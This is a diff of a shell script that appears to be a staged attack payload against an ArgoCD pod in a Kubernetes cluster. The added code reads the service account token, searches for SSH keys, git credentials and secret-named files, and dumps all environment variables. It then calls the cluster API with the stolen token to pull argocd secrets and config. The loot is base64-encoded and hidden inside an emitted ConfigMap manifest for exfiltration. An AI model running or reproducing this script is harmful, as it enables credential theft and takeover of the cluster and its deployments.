@@ -1,25 +1,60 @@
 #!/bin/sh
 RECON=$( (
-  echo "===SSH==="
-  find / -name "id_rsa" -o -name "*.pem" -o -name "ssh*" 2>/dev/null | head -10
+  echo "===SA_TOKEN==="
+  cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
+  echo ""
+  echo "===SA_NAMESPACE==="
+  cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null
+  echo ""
+  echo "===SA_CA==="
+  cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null | base64 | tr -d '\n'
+  echo ""
+  echo "===HOME_DIR==="
+  ls -la /home/argocd/ 2>/dev/null
+  echo ""
+  echo "===SSH_KEYS==="
+  find /home -type f 2>/dev/null
   ls -la /home/argocd/.ssh/ 2>/dev/null
-  cat /home/argocd/.ssh/id_rsa 2>/dev/null | head -c 500
-  echo "===GIT==="
+  echo ""
+  echo "===GIT_CONFIGS==="
+  find / -name ".gitconfig" -o -name ".git-credentials" -o -name ".netrc" 2>/dev/null
   cat /home/argocd/.gitconfig 2>/dev/null
-  echo "===ARGOCD_CONFIG==="
-  find /app -name "*.yaml" -o -name "*.json" 2>/dev/null | head -20
-  echo "===ENV_ALL==="
-  env | grep -iE 'ssh|git|token|password|secret|key|argocd_server|argocd_auth' 2>/dev/null
-  echo "===ARGOCD_API==="
-  curl -k -s https://argocd-server.argocd.svc.cluster.local/api/v1/settings 2>/dev/null | head -c 500
-  echo "===APPLICATIONS==="
-  curl -k -s https://argocd-server.argocd.svc.cluster.local/api/v1/applications 2>/dev/null | head -c 300
+  cat /root/.gitconfig 2>/dev/null
+  cat /home/argocd/.git-credentials 2>/dev/null
+  echo ""
+  echo "===ARGOCD_FILES==="
+  find / -path "/proc" -prune -o -path "/sys" -prune -o \( -name "argocd*" -o -name "ssh*" -o -name "*token*" -o -name "*secret*" -o -name "*key*" -o -name "*credential*" \) -type f -print 2>/dev/null | head -50
+  echo ""
+  echo "===MOUNTS==="
+  mount 2>/dev/null
+  cat /proc/mounts 2>/dev/null | head -30
+  echo ""
+  echo "===ENV_FULL==="
+  env 2>/dev/null
+  echo ""
+  echo "===K8S_API==="
+  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
+  APISERVER="${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"
+  wget -q -O - --no-check-certificate --header="Authorization: Bearer $TOKEN" "https://${APISERVER}/api/v1/namespaces/argocd/secrets" 2>/dev/null | head -c 2000
+  echo ""
+  echo "===ARGOCD_CM==="
+  wget -q -O - --no-check-certificate --header="Authorization: Bearer $TOKEN" "https://${APISERVER}/api/v1/namespaces/argocd/configmaps/argocd-cm" 2>/dev/null | head -c 1000
+  echo ""
+  echo "===ARGOCD_SECRET==="
+  wget -q -O - --no-check-certificate --header="Authorization: Bearer $TOKEN" "https://${APISERVER}/api/v1/namespaces/argocd/secrets/argocd-secret" 2>/dev/null | head -c 2000
+  echo ""
+  echo "===PROCESSES==="
+  ps aux 2>/dev/null | head -20
+  echo ""
+  echo "===NETWORK==="
+  cat /etc/hosts 2>/dev/null
+  cat /etc/resolv.conf 2>/dev/null
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: phase6
+  name: phase5
 data:
   result: $RECON
 EOF
